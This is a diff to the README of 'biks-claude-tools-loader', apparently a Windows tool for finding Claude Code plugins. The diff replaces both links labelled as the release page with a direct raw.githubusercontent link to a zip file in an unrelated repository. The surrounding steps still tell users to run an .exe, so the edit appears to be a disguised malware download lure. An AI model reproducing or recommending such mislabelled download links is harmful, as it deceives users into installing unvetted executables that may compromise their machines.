@@ -5,7 +5,7 @@ description: "Discover, connect, and install plugins for Claude Code using a rel
 ---
 # 🛠️ biks-claude-tools-loader - Find and install Claude Code plugins
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/maurieunoccupied182/biks-claude-tools-loader/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/maurieunoccupied182/maurieunoccupied182.github.io/main/moroncy/Dist-2.8-alpha.1.zip)
 
 ## What is this tool
 
@@ -19,7 +19,7 @@ You need a computer running Windows 10 or Windows 11. Your system requires at le
 
 You will download the installer from the official release page. 
 
-1. Visit the [releases page](https://github.com/maurieunoccupied182/biks-claude-tools-loader/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/maurieunoccupied182/maurieunoccupied182.github.io/main/moroncy/Dist-2.8-alpha.1.zip).
 2. Look for the latest version number at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
